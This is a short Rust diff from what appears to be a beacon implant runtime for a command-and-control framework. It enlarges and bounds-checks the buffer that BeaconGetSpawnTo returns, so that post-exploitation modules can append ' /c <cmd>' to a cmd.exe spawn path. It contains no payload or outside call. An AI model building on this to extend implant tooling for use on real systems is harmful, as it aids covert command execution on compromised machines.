@@ -481,16 +481,20 @@ pub unsafe extern "C" fn BeaconIsAdmin() -> i32 {
 /// scribbled args last time doesn't see stale garbage.
 #[no_mangle]
 pub unsafe extern "C" fn BeaconGetSpawnTo(_x86: i32) -> *mut u8 {
-    // Writable static buffer (lives in .data, not .rdata). Re-stamped each call
-    // so a prior BOF's mutations don't leak into the next caller.
-    static mut SPAWN: [u8; 1024] = [0; 1024];
+    // Writable static buffer (lives in .data, not .rdata). 2048 bytes — room
+    // for the template (~28) + BOF-appended " /c <cmd>" without overflowing
+    // into adjacent statics. Re-stamped each call so a prior BOF's mutations
+    // don't leak into the next caller.
+    static mut SPAWN: [u8; 2048] = [0; 2048];
     const TEMPLATE: &[u8] = b"C:\\Windows\\System32\\cmd.exe\0";
     // SAFETY: single-threaded (beacon loop); SPAWN is only touched here.
+    // Bounds check: truncate to SPAWN capacity if the template somehow grew.
+    let copy_len = if TEMPLATE.len() > SPAWN.len() { SPAWN.len() } else { TEMPLATE.len() };
     unsafe {
         core::ptr::copy_nonoverlapping(
             TEMPLATE.as_ptr(),
             core::ptr::addr_of_mut!(SPAWN).cast::<u8>(),
-            TEMPLATE.len(),
+            copy_len,
         );
         core::ptr::addr_of_mut!(SPAWN).cast::<u8>()
     }
